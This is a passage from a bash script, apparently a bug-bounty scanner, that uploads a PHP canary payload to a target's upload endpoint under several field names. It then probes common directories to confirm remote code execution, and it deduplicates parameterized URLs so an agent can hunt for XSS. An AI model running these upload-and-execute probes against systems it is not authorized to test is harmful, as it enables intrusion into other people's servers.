...
verify_upload_poc() {
    local upload_url="$1"; local base_url; base_url=$(echo "$upload_url" | cut -d'/' -f1-3); local ts; ts=$(date +%s)

    # Tech Detection
    local ext="php"; local payload='<?php echo "RCE-VAL-".(7*7); ?>'
    local headers; headers=$(curl -sk -I --max-time 5 "${BB_AUTH_ARGS[@]}" "$upload_url" || true)
    ...
    local canary; canary=$(mktemp /tmp/proof_XXXXXXXX."$ext")
    local canary_name; canary_name=$(basename "$canary")
    echo "$payload" > "$canary"
    log_step "  [VERIFY] Attempting RCE-Execution PoC (${ext}): $upload_url..."

    for param in "file" "upload" "FileData" "userfile" "image"; do
        # Try upload
        curl -sk -F "${param}=@${canary}" --max-time 10 "${BB_AUTH_ARGS[@]}" "$upload_url" > /dev/null || true

        # Check common upload dirs
        for dir in "/" "/uploads/" "/files/" "/media/" "/temp/" "/images/" "/wp-content/uploads/"; do
            local probe_url="${base_url}${dir}${canary_name}"
            local resp; resp=$(curl -sk -f --max-time 5 "${BB_AUTH_ARGS[@]}" "$probe_url" || true)
...
if ! skip_has xss; then
    log_info "Check 3: XSS — Parameter dedup for agent input"
    if [ -s "$PARAMS_FILE" ]; then
        ORIG_COUNT=$(wc -l < "$PARAMS_FILE" 2>/dev/null || echo 0)
        log_info "Deduplicating $ORIG_COUNT parameterized URLs for agent XSS hunting..."

        # Dedup by base-URL + sorted param keys (same logic as before, but output for agent)
        DEDUP_FILE="$FINDINGS_DIR/xss/xss_candidates_dedup.txt"
        python3 - "$PARAMS_FILE" "$DEDUP_FILE" <<'PYEOF' 2>/dev/null || cp "$PARAMS_FILE" "$DEDUP_FILE"
import sys
...
with open(sys.argv[1]) as fin, open(sys.argv[2], 'w') as fout:
    for line in fin:
        ...
        if key not in seen:
            ...
            fout.write(url + '\n')
PYEOF
        DEDUP_COUNT=$(wc -l < "$DEDUP_FILE" 2>/dev/null || echo 0)
        log_ok "Deduped: $ORIG_COUNT → $DEDUP_COUNT URLs written to $DEDUP_FILE"
        log_info "Agent can read $DEDUP_FILE for manual XSS hunting"
    fi
fi
...
log_info "Scan Complete. Consolidating..."
{
    ...
    echo "XSS (candidates)     : $(count_vuln "$FINDINGS_DIR/xss/xss_candidates_dedup.txt")"
